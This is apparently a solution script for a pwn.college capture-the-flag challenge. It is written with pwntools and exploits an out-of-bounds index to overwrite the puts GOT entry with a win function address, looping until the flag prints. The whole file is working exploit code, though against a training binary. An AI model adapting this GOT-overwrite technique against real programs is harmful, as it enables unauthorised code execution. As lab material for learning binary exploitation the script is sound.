#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/now-you-got-it-hard')


bssdata_base = 0x5200
got_plt_base = 0x5000
array_start = bssdata_base + (0x17a * 8) # <challenge+387> add    rdx,0x17a
puts_add = got_plt_base + 0x20
win = "4e98" # instead of callinng puts from start i call at open flag because i overwrite the puts address so puts call win again and gain in this function so i cann et flag so i pass the puts 
index = ((array_start - puts_add) // 8) * -1

def return_putchar_add(data):
    regex = r"Your hacker number is [0-9a-f]+"
    match = re.findall(regex,data.decode())[0].replace("Your hacker number is ","")
    return match

while 1:
    io = process()
    io.sendline(str(index).encode())
    time.sleep(0.6)
    data = io.recvuntil(b"What number would you like to replace it with?")
    win_add = int(return_putchar_add(data)[:-4] + win,16)
    io.sendline(str(win_add).encode())
    final_data = io.recvall()
#    print(hex(win_add),data.decode(),final_data.decode())
    if b"pwn.college" in final_data:
        print(final_data.decode())
        break
    io.close()
